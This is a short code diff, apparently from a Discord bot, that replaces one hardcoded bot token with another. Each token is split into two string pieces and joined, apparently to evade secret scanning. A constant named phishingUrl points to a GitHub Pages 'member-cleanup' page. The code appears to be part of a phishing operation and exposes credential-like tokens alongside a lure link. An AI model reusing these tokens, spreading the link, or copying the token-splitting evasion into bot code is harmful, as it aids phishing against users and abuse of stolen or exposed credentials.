@@ -1,5 +1,5 @@
-const part1 = "MTU2NjQ3NDIzNzc0MzczNDk0NQ.GkOjNe.";
-const part2 = "9WkxRc2uaempXmyLz_WAfIiSU_WjR14MVRMqE8";
+const part1 = "MTU2NTE4OTU2MTg5MjQ3NTAwMA.Grbllh.";
+const part2 = "Gc3mn8tYBGyg5i8TrTZW1f2fmKF69cUw_bD6Ec";
 const botToken = part1 + part2;
 
 const phishingUrl = "https://swiemali2-lgtm.github.io/member-cleanup/"; 
